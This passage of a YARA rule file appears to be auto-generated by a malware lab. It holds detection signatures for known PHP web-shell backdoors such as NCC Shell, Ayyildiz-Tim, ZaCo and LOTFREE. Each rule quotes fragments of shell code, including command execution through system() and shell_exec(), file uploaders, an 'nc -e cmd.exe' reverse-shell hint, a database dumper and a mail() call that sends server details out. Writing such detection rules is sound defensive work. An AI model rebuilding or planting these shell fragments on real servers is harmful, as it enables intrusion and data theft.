      $s16 = "        $_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $length);" fullword ascii /* score: '10.00'*/
      $s17 = "  <script type=\"text/javascript\" language=\"JavaScript\">" fullword ascii /* score: '10.00'*/
      $s18 = "      $token = substr($_REQUEST['command'], 0, $length);" fullword ascii /* score: '10.00'*/
      $s19 = "    if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== false)" fullword ascii /* score: '10.00'*/
      $s20 = "  </script>" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule backdoor_php_llama_c__8de0f8ef54bf {
   meta:
      description = "php__loose__php - file backdoor_php_llama_c__8de0f8ef54bf"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "8de0f8ef54bff5e3b694b7585dc66ef9fd5a4b019a6650b8a2211db888e59dac"
   strings:
      $s1 = "      <tr><td><b>Execute command:</b></td><td><input name=\"king\" type=\"text\" size=\"100\" value=\"<? echo $curcmd; ?>\"></td" ascii /* score: '21.00'*/
      $s2 = "    if(($_POST['exe']) == \"Execute\") {" fullword ascii /* score: '18.00'*/
      $s3 = "      <td><input name=\"exe\" type=\"submit\" value=\"Execute\"></td></tr>" fullword ascii /* score: '13.00'*/
      $s4 = " $curcmd = $_POST['king'];" fullword ascii /* score: '12.00'*/
      $s5 = " $curcmd = \"ls -lah\";" fullword ascii /* score: '11.00'*/
      $s6 = "if($_POST['dir'] == \"\") {" fullword ascii /* score: '9.00'*/
      $s7 = "$ob = @ini_get(\"open_basedir\");" fullword ascii /* score: '9.00'*/
      $s8 = " $curdir = $_POST['dir'];" fullword ascii /* score: '9.00'*/
      $s9 = "if( ini_get('safe_mode') ) {" fullword ascii /* score: '9.00'*/
      $s10 = "if($_POST['king'] == \"\") {" fullword ascii /* score: '9.00'*/
      $s11 = "$df = @ini_get(\"disable_functions\");" fullword ascii /* score: '9.00'*/
      $s12 = "     }" fullword ascii /* reversed goodware string '}     ' */ /* score: '6.00'*/
      $s13 = "  </head>" fullword ascii /* score: '6.00'*/
      $s14 = "    if(($_POST['upl']) == \"Upload\" ) {" fullword ascii /* score: '6.00'*/
      $s15 = "  <head>" fullword ascii /* score: '6.00'*/
      $s16 = "                        \"http://www.w3.org/TR/html4/loose.dtd\">" fullword ascii /* score: '5.00'*/
      $s17 = "    if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir.\"/\".$_FILES['fila']['name'])) {" fullword ascii /* score: '4.00'*/
      $s18 = "    <table><form method=\"post\" enctype=\"multipart/form-data\">" fullword ascii /* score: '4.00'*/
      $s19 = "      $buffer = fgets($f, 4096);" fullword ascii /* score: '4.00'*/
      $s20 = "        echo \"There was an error uploading the file, please try again!\";" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule backdoor_php_rootshell_b__4dbb242ca048 {
   meta:
      description = "php__loose__php - file backdoor_php_rootshell_b__4dbb242ca048"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "4dbb242ca048c23d4728ba34c6fefa8943f8d132b662a957d97ad0054c1e1756"
   strings:
      $x1 = "        back Shell, use: <i>nc -e cmd.exe [SERVER] 3333<br>" fullword ascii /* score: '34.00'*/
      $s2 = "      <p align=\"center\"><font face=\"Verdana\" size=\"2\">[ Command Execute ]</font></td>" fullword ascii /* score: '23.00'*/
      $s3 = "/*    0.3.2          666            coded a new uploader" fullword ascii /* score: '22.00'*/
      $s4 = " 2006 by <a style=\"text-decoration: none\" target=\"_blank\" href=\"http://www.SR-Crew.org\">SR-Crew</a> </font></td>" fullword ascii /* score: '20.00'*/
      $s5 = "<br><input type=\"submit\" value=\"Execute!\"><br>" fullword ascii /* score: '18.00'*/
      $s6 = "$filecontents = stripslashes(html_entity_decode($_POST[\"contents\"]));" fullword ascii /* score: '16.00'*/
      $s7 = "<form method=\"post\" action=\"<?echo $scriptname;?>\">" fullword ascii /* score: '15.00'*/
      $s8 = "$filecontents = htmlentities(file_get_contents($filename));" fullword ascii /* score: '14.00'*/
      $s9 = "        </i>after local command: <i>nc -v -l -p 3333 </i>(Windows)</font><br /><br /> <td><p align=\"center\"><br>" fullword ascii /* score: '14.00'*/
      $s10 = "echo '<a target=\"blank\" href='.$file.'>'.$file.'</a><br>';" fullword ascii /* score: '14.00'*/
      $s11 = "<font face=\"Verdana\" style=\"font-size: 8pt\">Insert your commands here:</font><br>" fullword ascii /* score: '12.00'*/
      $s12 = "<textarea size=\"70\" name=\"command\" rows=\"2\" cols=\"40\" ></textarea> <br>" fullword ascii /* score: '12.00'*/
      $s13 = "$status = \"<font face='Verdana' style='font-size: 8pt'>Error or No contents in file</font>\";" fullword ascii /* score: '12.00'*/
      $s14 = "/*    Version        Nick            Description" fullword ascii /* score: '12.00'*/
      $s15 = "/*    0.3.2          666            new password protection" fullword ascii /* score: '11.00'*/
      $s16 = "/*    0.3.1          666            password protection" fullword ascii /* score: '11.00'*/
      $s17 = "/*  ummQHMM9C!.uQo.??WMMMMNNQQkI!!?wqQQQQHMMMYC!.umx.?7WMNHmmmo */" fullword ascii /* score: '11.00'*/
      $s18 = "/*    0.3.3          666            added a lot of comments :)" fullword ascii /* score: '10.00'*/
      $s19 = "$scriptname = $_SERVER['SCRIPT_NAME'];" fullword ascii /* score: '10.00'*/
      $s20 = "        <textarea readonly size=\"1\" rows=\"7\" cols=\"53\"><?php @$output = system($_POST['command']); ?></textarea><br>" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule backdoor_php_nccshell_a__86b3cb8b0769 {
   meta:
      description = "php__loose__php - file backdoor_php_nccshell_a__86b3cb8b0769"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "86b3cb8b07690e50de629866e7210ba13150597e1d537bcf673cb904f599aeb6"
   strings:
      $s1 = "<? $cmd = $_REQUEST[\"-cmd\"];?><onLoad=\"document.forms[0].elements[-cmd].focus()\"><form method=POST><br><input type=TEXT name" ascii /* score: '29.00'*/
      $s2 = "md\" size=64 value=<?=$cmd?>><hr><pre><?if($cmd != \"\") print Shell_Exec($cmd);?></pre></form><br>" fullword ascii /* score: '24.00'*/
      $s3 = "<a href=\"http://www.n-c-c.6x.to\" target=\"_blank\">-->NCC<--</a></center></b></html>" fullword ascii /* score: '22.00'*/
      $s4 = "<title>Upload - Shell/Datei</title>" fullword ascii /* score: '20.00'*/
      $s5 = "<b>--Coded by Silver" fullword ascii /* score: '16.00'*/
      $s6 = "echo \"<b><font color=red><br>REFERER: </font></b>\"; echo $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s7 = "<h2>- Upload -</h2>" fullword ascii /* score: '14.00'*/
      $s8 = "<h2>IpLogger</h2>" fullword ascii /* score: '14.00'*/
      $s9 = "<? $cmd = $_REQUEST[\"-cmd\"];?><onLoad=\"document.forms[0].elements[-cmd].focus()\"><form method=POST><br><input type=TEXT name" ascii /* score: '14.00'*/
      $s10 = "<h1>.:NCC:. Shell v1.0.0</h1>" fullword ascii /* score: '12.00'*/
      $s11 = "<title>.:NCC:. Shell v1.0.0</title>" fullword ascii /* score: '12.00'*/
      $s12 = "if( ini_get('safe_mode') ) {" fullword ascii /* score: '9.00'*/
      $s13 = "if(@$_GET['p']==\"info\"){" fullword ascii /* score: '9.00'*/
      $s14 = "<head><h2>Hacked by Silver</h2></head>" fullword ascii /* score: '9.00'*/
      $s15 = " method=\"post\"" fullword ascii /* score: '9.00'*/
      $s16 = " if (isset($_FILES['probe']) and ! $_FILES['probe']['error']) {" fullword ascii /* score: '7.00'*/
      $s17 = "   move_uploaded_file($_FILES['probe']['tmp_name'], \"./dingen.php\");" fullword ascii /* score: '7.00'*/
      $s18 = "echo \"<b><font color=red>Momentane Directory:  </font></b>\"; echo $_SERVER['DOCUMENT_ROOT'];" fullword ascii /* score: '7.00'*/
      $s19 = "echo \"<b><font color=red><br>IP: </font></b>\"; echo $_SERVER['REMOTE_ADDR'];" fullword ascii /* score: '7.00'*/
      $s20 = "echo \"<b><font color=red><br>BROWSER: </font></b>\"; echo $_SERVER[HTTP_REFERER];" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x633c and filesize < 7KB and
      8 of them
}

rule backdoor_php_xkn_a__cdadd3591bd1 {
   meta:
      description = "php__loose__php - file backdoor_php_xkn_a__cdadd3591bd1"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "cdadd3591bd11387f78dd14160db7775878141d58efe232d34590da1d1c6f0e1"
   strings:
      $x1 = "  elseif ( $cmd==\"execute\" ) {/*<!-- Execute the executable -->*/" fullword ascii /* score: '34.00'*/
      $x2 = "elseif ( $cmd==\"uploadproc\" ) { /* <!-- Process Uploaded file --> */" fullword ascii /* score: '33.00'*/
      $x3 = "/* <!-- Execute --> */" fullword ascii /* score: '31.00'*/
      $s4 = "echo sp(3).buildUrl( $img[\"Execute\"], \"cmd=execute&file=$dir/$file\").\"\\n\";" fullword ascii /* score: '30.00'*/
      $s5 = "<input name=\"submit_btn\" class=\"inputbutton\" type=\"submit\" value=\"Execute Command\"></p>" fullword ascii /* score: '24.00'*/
      $s6 = "/* <!-- Download --> */" fullword ascii /* score: '23.00'*/
      $s7 = "<!-- <?php echo $scriptident ?>, <?php echo $scriptver ?>, <?php echo $scriptdate ?>  -->" fullword ascii /* score: '23.00'*/
      $s8 = "elseif ( $cmd==\"file\" ) { /* <!-- View a file in text --> */" fullword ascii /* score: '22.00'*/
      $s9 = "elseif ( $cmd==\"ren\" ) { /* <!-- File and Directory Rename --> */" fullword ascii /* score: '22.00'*/
      $s10 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword ascii /* score: '22.00'*/
      $s11 = "elseif ( $cmd==\"saveedit\" ) { /*<!-- Save the edited file back to a file --> */" fullword ascii /* score: '22.00'*/
      $s12 = " elseif ( $cmd==\"delfile\" ) { /*<!-- Delete a file --> */" fullword ascii /* score: '22.00'*/
      $s13 = "elseif ( $cmd==\"newfile\" ) { /*<!-- Create new file with default name --> */" fullword ascii /* score: '22.00'*/
      $s14 = "elseif ( $cmd==\"edit\" ) { /*<!-- Edit a file and save it afterwards with the saveedit block. --> */" fullword ascii /* score: '22.00'*/
      $s15 = "elseif ( $cmd==\"downl\" ) { /*<!-- Save the edited file back to a file --> */" fullword ascii /* score: '22.00'*/
      $s16 = "elseif ( $cmd==\"newdir\" ) { /*<!-- Create new directory with default name --> */" fullword ascii /* score: '22.00'*/
      $s17 = "/* HTTP Authorisation password, uncomment if you want to use this */" fullword ascii /* score: '22.00'*/
      $s18 = "elseif ( $cmd==\"deldir\" ) { /*<!-- Delete a directory and all it's files --> */" fullword ascii /* score: '22.00'*/
      $s19 = "server. If you do not have enough access rights on the server, the script will hide commands or will even return errors to your " ascii /* score: '21.00'*/
      $s20 = "header(\"Content-Disposition: attachment; filename=$downloadto$add\");" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule backdoor_php_ayyildiztim__12b46dabe382 {
   meta:
      description = "php__loose__php - file backdoor_php_ayyildiztim__12b46dabe382"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "12b46dabe382f7a8ea7f54eacf1412c7c3e7ba864e0000ee936dac29681ef307"
   strings:
      $s1 = "document.forms[0].command.focus();" fullword ascii /* score: '19.00'*/
      $s2 = "<!-- MELEK -->" fullword ascii /* score: '17.00'*/
      $s3 = "<meta name=\"Description\" content=\"Thehacker\">" fullword ascii /* score: '15.00'*/
      $s4 = "  system($command);" fullword ascii /* score: '15.00'*/
      $s5 = "<title>Ayyildiz-Tim Shell <?php echo PHPSHELL_VERSION ?></title>" fullword ascii /* score: '15.00'*/
      $s6 = "cker. v 2.1 - <a href=\"http|//www.ayyildiz.org\" class=\"style1\">www.ayyildiz.org</a> </p>" fullword ascii /* score: '14.00'*/
      $s7 = "if (!empty($command)) {" fullword ascii /* score: '12.00'*/
      $s8 = "  if (!empty($HTTP_GET_VARS))" fullword ascii /* score: '12.00'*/
      $s9 = "define('PHPSHELL_VERSION', '');" fullword ascii /* score: '12.00'*/
      $s10 = "  if (!empty($HTTP_POST_VARS))" fullword ascii /* score: '12.00'*/
      $s11 = "$work_dir = exec('pwd');" fullword ascii /* score: '12.00'*/
      $s12 = "<meta name=\"KeyWords\" content=\"DefaCed\">" fullword ascii /* score: '12.00'*/
      $s13 = "  } else if ($command == 'ls') {" fullword ascii /* score: '12.00'*/
      $s14 = "  if (!empty($command)) {" fullword ascii /* score: '12.00'*/
      $s15 = "    $tmpfile = tempnam('/tmp', 'phpshell');" fullword ascii /* score: '11.00'*/
      $s16 = "    $command .= ' -F';" fullword ascii /* score: '11.00'*/
      $s17 = "      /* We try and match a cd command. */" fullword ascii /* score: '11.00'*/
      $s18 = "/* Run through all the files and directories to find the dirs. */" fullword ascii /* score: '11.00'*/
      $s19 = "document.all.welle.filters[0].phase += 10;" fullword ascii /* score: '10.00'*/
      $s20 = "<script language=\"JavaScript1.2\">" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 30KB and
      8 of them
}

rule backdoor_php_matamumat_a__91a8a7a68a96 {
   meta:
      description = "php__loose__php - file backdoor_php_matamumat_a__91a8a7a68a96"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "91a8a7a68a966b89feeabc887a84f5302daf379cc6feef3a58b20122f43004ef"
   strings:
      $s1 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" fullword ascii /* score: '28.00'*/
      $s2 = "document.forms[0].command.focus();" fullword ascii /* score: '19.00'*/
      $s3 = "  system($command);" fullword ascii /* score: '15.00'*/
      $s4 = "if (!empty($command)) {" fullword ascii /* score: '12.00'*/
      $s5 = "  if (!empty($HTTP_GET_VARS))" fullword ascii /* score: '12.00'*/
      $s6 = "  if (!empty($HTTP_POST_VARS))" fullword ascii /* score: '12.00'*/
      $s7 = "$work_dir = exec('pwd');" fullword ascii /* score: '12.00'*/
      $s8 = "  } else if ($command == 'ls') {" fullword ascii /* score: '12.00'*/
      $s9 = "  if (!empty($command)) {" fullword ascii /* score: '12.00'*/
      $s10 = "define('PHPSHELL_VERSION', '1.7');" fullword ascii /* score: '12.00'*/
      $s11 = "<p>Command: <input type=\"text\" name=\"command\" size=\"60\">" fullword ascii /* score: '12.00'*/
      $s12 = "    $tmpfile = tempnam('/tmp', 'phpshell');" fullword ascii /* score: '11.00'*/
      $s13 = "    $command .= ' -F';" fullword ascii /* score: '11.00'*/
      $s14 = "      /* We try and match a cd command. */" fullword ascii /* score: '11.00'*/
      $s15 = "/* Run through all the files and directories to find the dirs. */" fullword ascii /* score: '11.00'*/
      $s16 = "if (ini_get('register_globals') != '1') {" fullword ascii /* score: '9.00'*/
      $s17 = "<form name=\"myform\" action=\"<?php echo $PHP_SELF ?>\" method=\"post\">" fullword ascii /* score: '9.00'*/
      $s18 = "/* Now we make a list of the directories. */" fullword ascii /* score: '8.00'*/
      $s19 = "/* work_dir is only 1 charecter - it can only be / There's no" fullword ascii /* score: '8.00'*/
      $s20 = "  /* We'll register the variables as globals: */" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule backdoor_php_loaders_a_b__63a7b9625ecd {
   meta:
      description = "php__loose__php - file backdoor_php_loaders_a_b__63a7b9625ecd"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "63a7b9625ecdfe253befe8a061a8d3d9e1475eb8f36d54f67dfc63bb410f0277"
   strings:
      $x1 = "echo \"Total space \" . (int)(disk_total_space(getcwd())/(1024*1024)) . \"Mb \" . \"Free space \" . (int)(disk_free_space(getcwd" ascii /* score: '31.00'*/
      $s2 = "<center>Coded by Loader <a href=\"http://pro-hack.ru\">Pro-Hack.RU</a></center>" fullword ascii /* score: '28.00'*/
      $s3 = "echo \"uname:\" . execute('uname -a') . \"<br>\";" fullword ascii /* score: '28.00'*/
      $s4 = "/* Loader'z WEB Shell v 0.1.0.2 {15 " fullword ascii /* score: '26.00'*/
      $s5 = "print \"<center><div id=logostrip>Something is wrong. Download - IS NOT OK</div></center>\";" fullword ascii /* score: '23.00'*/
      $s6 = "print \"<center><div id=logostrip>Download - OK. (\".$sizef.\"" fullword ascii /* score: '23.00'*/
      $s7 = "<title>Loader'z WEB shell</title>" fullword ascii /* score: '21.00'*/
      $s8 = "echo decode(execute($cmd));" fullword ascii /* score: '21.00'*/
      $s9 = "echo \" Exec here: \" . ini_get('safe_mode_exec_dir');" fullword ascii /* score: '21.00'*/
      $s10 = "function execute($com)" fullword ascii /* score: '21.00'*/
      $s11 = "echo \"<center><div id=logostrip>Command: $cmd<br><textarea cols=100 rows=20>\";" fullword ascii /* score: '19.00'*/
      $s12 = "echo \"<center><div id=logostrip>Edit file: $ef </div><form action=\\\"$REQUEST_URI\\\" method=\\\"POST\\\"><textarea name=conte" ascii /* score: '19.00'*/
      $s13 = "echo \"<center><div id=logostrip>Edit file: $ef </div><form action=\\\"$REQUEST_URI\\\" method=\\\"POST\\\"><textarea name=conte" ascii /* score: '19.00'*/
      $s14 = "copy($HTTP_POST_FILES[\"userfile\"][\"tmp_name\"],$HTTP_POST_FILES[\"userfile\"][\"name\"]);" fullword ascii /* score: '18.00'*/
      $s15 = "echo execute(\"ver\") . \"<br>\";" fullword ascii /* score: '18.00'*/
      $s16 = "echo execute(\"id\") . \"<br>\";" fullword ascii /* score: '18.00'*/
      $s17 = "echo \"<center><div id=logostrip>Results of PHP execution<br><br>\";" fullword ascii /* score: '17.00'*/
      $s18 = "execute($cmd);" fullword ascii /* score: '17.00'*/
      $s19 = "if (ini_get('safe_mode_exec_dir')){" fullword ascii /* score: '17.00'*/
      $s20 = "exec(\"perl \" . $_POST['installpath']);" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule backdoor_php_nshell_c__a4f5649bb835 {
   meta:
      description = "php__loose__php - file backdoor_php_nshell_c__a4f5649bb835"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "a4f5649bb8356f0d78830c3e3ac032624dda4da5b5288190975aaa9c0cb4992f"
   strings:
      $s1 = "$form1=\"<center><form method=GET action='\".$_SERVER['PHP_SELF'].\"'><table width=100% boder=0><td width=100%> User Name : <inp" ascii /* score: '23.00'*/
      $s2 = "echo \"<b><font color=\\\"#000000\\\" size=\\\"3\\\" face=\\\"Georgia\\\"> System information: :</font><br>\";             $ra44" ascii /* score: '21.00'*/
      $s3 = "$function=passthru; // system, exec, cmd" fullword ascii /* score: '20.00'*/
      $s4 = "text name=pass size=20> Port : <input type=text name=port size=20><input type=submit value=login></form></td></form></table><hr " ascii /* score: '18.00'*/
      $s5 = "$res=shell_exec($comd);" fullword ascii /* score: '17.00'*/
      $s6 = "$script=$_POST['script'];" fullword ascii /* score: '15.00'*/
      $s7 = "$group[\"execute\"] = ($mode & 00010) ? 'x' : '-';" fullword ascii /* score: '14.00'*/
      $s8 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-';" fullword ascii /* score: '14.00'*/
      $s9 = "if( $mode & 0x200 ) $world[\"execute\"] = ($world['execute']=='x') ? 't' : 'T';" fullword ascii /* score: '14.00'*/
      $s10 = "$owner[\"execute\"] = ($mode & 00100) ? 'x' : '-';" fullword ascii /* score: '14.00'*/
      $s11 = "if( $mode & 0x400 ) $group[\"execute\"] = ($group['execute']=='x') ? 's' : 'S';" fullword ascii /* score: '14.00'*/
      $s12 = "$s.=sprintf(\"%1s%1s%1s\", $group['read'], $group['write'], $group['execute']);" fullword ascii /* score: '14.00'*/
      $s13 = "$s.=sprintf(\"%1s%1s%1s\", $world['read'], $world['write'], $world['execute']);" fullword ascii /* score: '14.00'*/
      $s14 = "if( $mode & 0x800 ) $owner[\"execute\"] = ($owner['execute']=='x') ? 's' : 'S';" fullword ascii /* score: '14.00'*/
      $s15 = "$s.=sprintf(\"%1s%1s%1s\", $owner['read'], $owner['write'], $owner['execute']);" fullword ascii /* score: '14.00'*/
      $s16 = ".\" target=_blank>$filename</a></td><td>\" .ucwords(filetype($filename)). \"</td><td>\" . filesize($filename) . \"</td><td>\" . " ascii /* score: '14.00'*/
      $s17 = "echo \"<font color=\\\"black\\\"><a href=\".$_SERVER['PHP_SELF'].\"?act=info target=_blank>Php Info</a></font><br></div>\";" fullword ascii /* score: '14.00'*/
      $s18 = ".\" target=_blank>$filename</a></td><td>\" .ucwords(filetype($filename)). \"</td><td>\" . filesize($filename) . \"</td><td>\" . " ascii /* score: '14.00'*/
      $s19 = "}elseif(function_exists(\"shell_exec\"))" fullword ascii /* score: '14.00'*/
      $s20 = "99);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0xbb3f and filesize < 40KB and
      8 of them
}

rule backdoor_php_zaco_a__641927f65903 {
   meta:
      description = "php__loose__php - file backdoor_php_zaco_a__641927f65903"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "641927f65903334707c32c58f1dd7b4e4ccd4982ca461281ba1cf5b36c52c9f5"
   strings:
      $s1 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c8" ascii /* score: '26.00'*/
      $s2 = "header(\"Content-Disposition: attachment; filename=\\\"dump_{$db_dump}.sql\".($archive=='none'?'':'.gz').\"\\\"\\n\\n\");" fullword ascii /* score: '22.00'*/
      $s3 = "header(\"Content-Disposition: attachment; filename=\\\"dump_{$db_dump}_${table_dump}.sql\".($archive=='none'?'':'.gz').\"\\\"\\n" ascii /* score: '22.00'*/
      $s4 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword ascii /* score: '19.00'*/
      $s5 = "$db_dump=isset($_POST['db_dump'])?$_POST['db_dump']:'';" fullword ascii /* score: '19.00'*/
      $s6 = "$table_dump=isset($_POST['table_dump'])?$_POST['table_dump']:'';" fullword ascii /* score: '19.00'*/
      $s7 = "$result2=mysql_query('select * from `'.$table_dump.'`',$mysql_link);" fullword ascii /* score: '18.00'*/
      $s8 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword ascii /* score: '17.00'*/
      $s9 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword ascii /* score: '17.00'*/
      $s10 = "if(!$result2)echo('error table '.$table_dump);" fullword ascii /* score: '17.00'*/
      $s11 = "$temp_file=isset($_POST['temp_file'])?'on':'nn';" fullword ascii /* score: '16.00'*/
      $s12 = "$dump_file=\"#ZaCo MySQL Dumper\\n#db $db from $host\\n\";" fullword ascii /* score: '14.00'*/
      $s13 = "$dump_file.='`'.$rows2[0].'` '.$rows2[1].($rows2[2]=='NO'&&$rows2[4]!='NULL'?' NOT NULL DEFAULT \\''.$rows2[4].'\\'':' DEFAULT N" ascii /* score: '14.00'*/
      $s14 = "$dump_file.='create table `'.$rows[0].\"`(\\n\";" fullword ascii /* score: '14.00'*/
      $s15 = "hn.barker446@gmail.com\";mail($sd98, $sj98, $msg8873, \"From: $sd98\");" fullword ascii /* score: '14.00'*/
      $s16 = "$dump_file=gzencode($dump_file);" fullword ascii /* score: '14.00'*/
      $s17 = "$dump_file.='insert into `'.$table_dump.'` values (';" fullword ascii /* score: '14.00'*/
      $s18 = "$dump_file.='insert into `'.$rows[0].'` values (';" fullword ascii /* score: '14.00'*/
      $s19 = "$dump_file.='`'.$rows2[0].'` '.$rows2[1].($rows2[2]=='NO'&&$rows2[4]!='NULL'?' NOT NULL DEFAULT \\''.$rows2[4].'\\'':' DEFAULT N" ascii /* score: '14.00'*/
      $s20 = "<tr><td><input type=submit name='action' value='dump'></td></tr>" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}

rule backdoor_php_ekinoxshell_b__078d640f9105 {
   meta:
      description = "php__loose__php - file backdoor_php_ekinoxshell_b__078d640f9105"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "078d640f91054935e266c5152077675946697c77df05559474b4eedcabbea0d9"
   strings:
      $s1 = "<option value='op0'>Execute quick commands</option>" fullword ascii /* score: '26.00'*/
      $s2 = "print $st.$c1.\"<div><b><center>Execute useful commands</div>\";" fullword ascii /* score: '26.00'*/
      $s3 = "if (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])){print \"<div><b><center>[ Executed command ][$] : \".$_REQUEST['cmd']." ascii /* score: '26.00'*/
      $s4 = "if (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])){print \"<div><b><center>[ Executed command ][$] : \".$_REQUEST['cmd']." ascii /* score: '26.00'*/
      $s5 = "if(strstr(php_os,\"WIN\")){$epath=\"cmd.exe\";}else{$epath=\"/bin/sh\";}" fullword ascii /* score: '25.00'*/
      $s6 = "print \" - <a target='_blank' href=\".inclink('dlink', 'phpinfo').\">phpinfo</a>\";" fullword ascii /* score: '22.00'*/
      $s7 = "print \"<center><div><b>Enter the command to execute\";print $ec;" fullword ascii /* score: '22.00'*/
      $s8 = "www.site2.com" fullword ascii /* score: '21.00'*/
      $s9 = "www.site1.com" fullword ascii /* score: '21.00'*/
      $s10 = "elseif(!function_exists(popen)){ ob_start();system($ocmd);$nval=ob_get_contents();ob_clean();}elseif(!function_exists(system)){" fullword ascii /* score: '20.00'*/
      $s11 = "print\"<center>Copyright  is reserved to Ekin0x <br>[  By Cyber Security TIM Go to : <a target='_blank' href='http://www.cyber-w" ascii /* score: '20.00'*/
      $s12 = "ob_start();passthru($ocmd);$nval=ob_get_contents();ob_clean();}" fullword ascii /* score: '20.00'*/
      $s13 = "print \\$sock \\\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\n\\\";" fullword ascii /* score: '20.00'*/
      $s14 = "my \\$target = inet_aton(\\$host);" fullword ascii /* score: '19.00'*/
      $s15 = "<option value='op3'>/var/cpanel/accounting.log</option>" fullword ascii /* score: '19.00'*/
      $s16 = "if ($_REQUEST['uscmnds']=='op3'){callfuncs('cat /var/cpanel/accounting.log');}" fullword ascii /* score: '19.00'*/
      $s17 = "</select> \";print\"<input type=submit name=subqcmnds value=Execute style='height:20'> <input type=reset value=Return style='hei" ascii /* score: '18.00'*/
      $s18 = "input(\"submit\",\"\",\"Execute\",\"\");print \"</center>\".$ef.$ec.$et.\"</div></td>\";" fullword ascii /* score: '18.00'*/
      $s19 = "<option value='t8'>Make</option></select> \";input('text','ustname','',51);print \" \";input('submit','ustsub','Execute');print " ascii /* score: '18.00'*/
      $s20 = "print \" - <a href='javascript:history.back()'>Geri</a>\";" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x2020 and filesize < 100KB and
      8 of them
}

rule backdoor_php_agent_lotfree_a__7a5cd8bf8dd9 {
   meta:
      description = "php__loose__php - file backdoor_php_agent_lotfree_a__7a5cd8bf8dd9"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "7a5cd8bf8dd929e703176c9bb402f273539ec504a91f71b122efe1df5a465929"
   strings:
      $s1 = "Executer une commande <input type=\"text\" name=\"cmd\"> <input type=\"submit\" value=\"g0!\">" fullword ascii /* score: '26.00'*/
      $s2 = "Execute commands, browse the filesystem<br>" fullword ascii /* score: '26.00'*/
      $s3 = "Uploader un fichier dans le repertoire courant :<br>" fullword ascii /* score: '15.00'*/
      $s4 = "  header(\"Content-Disposition: attachment; filename=\".basename($_REQUEST[\"down\"]));" fullword ascii /* score: '14.00'*/
      $s5 = "  header(\"Content-Length: \".filesize($_REQUEST[\"down\"]));" fullword ascii /* score: '14.00'*/
      $s6 = "<head><title>LOTFREE PHP Backdoor v1.5</title></head>" fullword ascii /* score: '13.00'*/
      $s7 = "  if(isset($_FILES[\"fic\"][\"name\"]) && isset($_POST[\"MAX_FILE_SIZE\"]))" fullword ascii /* score: '12.00'*/
      $s8 = "  if(isset($_REQUEST['cmd']) && $_REQUEST['cmd']!=\"\")" fullword ascii /* score: '12.00'*/
      $s9 = "PHP Backdoor Version 1.5<br>" fullword ascii /* score: '11.00'*/
      $s10 = "<a href=\"http://www.lsdp.net/~lotfree\">http://www.lsdp.net/~lotfree</a><br>" fullword ascii /* score: '10.00'*/
      $s11 = "  header(\"Content-Type: application/octet-stream\");" fullword ascii /* score: '10.00'*/
      $s12 = "<form enctype=\"multipart/form-data\" method=\"post\" action=\"<?php echo $_SERVER['PHP_SELF'].\"?dir=$dir\"; ?>\">" fullword ascii /* score: '9.00'*/
      $s13 = "<form method=\"post\" action=\"<?php echo $_SERVER['PHP_SELF'].\"?dir=$dir\"; ?>\">" fullword ascii /* score: '9.00'*/
      $s14 = "  echo \"Actuellement dans <b>\".getcwd().\"</b><br>\\n\";" fullword ascii /* score: '9.00'*/
